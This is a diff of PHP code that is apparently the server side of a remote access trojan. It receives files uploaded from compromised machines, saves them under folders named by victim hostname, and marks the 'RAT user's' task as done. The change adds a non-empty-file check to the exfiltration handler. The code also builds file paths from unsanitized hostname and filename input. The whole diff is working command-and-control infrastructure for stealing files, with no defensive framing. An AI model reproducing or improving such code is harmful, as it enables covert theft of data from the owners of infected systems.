@@ -79,18 +79,22 @@
     {
       $hostname = $_POST["hostname"]; # Stores hostname
 
-      # Does the downloads/<SYSTEM> directory exist?
-      # If not we create the directory
-      if (!file_exists($downloadsPath . $hostname))
+      # If remote file is not a blank file and/or actually exists
+      if ($_FILES["download"]["size"] > 0)
       {
-        mkdir($downloadsPath . $hostname);
-      }
+        # Does the downloads/<SYSTEM> directory exist?
+        # If not we create the directory
+        if (!file_exists($downloadsPath . $hostname))
+        {
+          mkdir($downloadsPath . $hostname);
+        }
 
-      # Moves uploaded file from the /tmp directory to the downloads/<SYSTEM> directory
-      $filename = $_FILES["download"]["name"];
-      $tempFilePath = $_FILES["download"]["tmp_name"];
-      $fileDestination = $downloadsPath . $hostname . "/" . $filename;
-      move_uploaded_file($tempFilePath, $fileDestination);
+        # Moves uploaded file from the /tmp directory to the downloads/<SYSTEM> directory
+        $filename = $_FILES["download"]["name"];
+        $tempFilePath = $_FILES["download"]["tmp_name"];
+        $fileDestination = $downloadsPath . $hostname . "/" . $filename;
+        move_uploaded_file($tempFilePath, $fileDestination);
+      }
 
       # Updates status to "Y" in "output" table
       # This informs the RAT user that the task completed
@@ -109,7 +113,7 @@
       $statement->execute();
 
       # Kills database connection
-      $statement->connection = null;
+      $statement->connection = null;   
     }
   }
 ?>
